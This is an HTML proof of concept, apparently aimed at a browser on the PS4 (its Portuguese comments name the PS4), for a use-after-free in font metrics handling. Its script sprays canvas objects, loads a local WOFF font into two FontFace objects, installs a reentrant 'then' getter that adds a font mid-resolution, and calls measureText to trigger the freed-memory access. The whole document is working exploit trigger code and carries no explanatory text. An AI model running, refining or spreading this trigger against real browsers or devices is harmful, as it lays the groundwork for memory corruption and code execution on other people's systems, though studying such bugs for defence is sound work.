<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - FontMetrics UAF (Commit Original + Ahem)</title>
</head>
<body>
<script>
var dummyId = 0;
var alive = [];

for (var i = 0; i < 500; i++) {
    var d = document.createElement('canvas');
    d.width = 1; 
    d.height = 1;
    d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
    alive.push(d);
}

// Carregar o Ahem.woff localmente para garantir o parse correto no PS4
var xhr = new XMLHttpRequest();
xhr.open('GET', 'resources/Ahem.woff', false);
xhr.overrideMimeType('text/plain; charset=x-user-defined');
xhr.send();

if (xhr.status === 200 || xhr.status === 0) {
    var text = xhr.responseText;
    var bytes = new Uint8Array(text.length);
    for (var i = 0; i < text.length; i++) {
        bytes[i] = text.charCodeAt(i) & 0xff;
    }
    var blob = new Blob([bytes], { type: 'font/woff' });
    var dataUrl = URL.createObjectURL(blob);

    // Estrutura exata de duas fontes do commit original usando o binário válido
    var metricsDonor = new FontFace('metricsDonor', 'url("' + dataUrl + '")');
    var measured = new FontFace('measured', 'url("' + dataUrl + '")', { unicodeRange: 'U+13A0-13FF' });

    document.fonts.add(metricsDonor);
    document.fonts.add(measured);
    alive.push(metricsDonor, measured);

    var reen = false;
    Object.defineProperty(metricsDonor, 'then', {
        configurable: true,
        get: function() {
            if (reen) return undefined;
            reen = true;
            document.fonts.add(new FontFace('Unrelated', 'local("x")'));
            reen = false;
            return undefined;
        }
    });

    var canvas = document.createElement('canvas');
    canvas.width = 64; 
    canvas.height = 64;
    canvas.style.cssText = 'position:absolute;left:-9999px';
    document.body.appendChild(canvas);
    alive.push(canvas);

    var ctx = canvas.getContext('2d');
    ctx.font = '10px metricsDonor, measured';

    ctx.measureText('\u13A0\u13A2\u13A4');
}
</script>
</body>
</html>
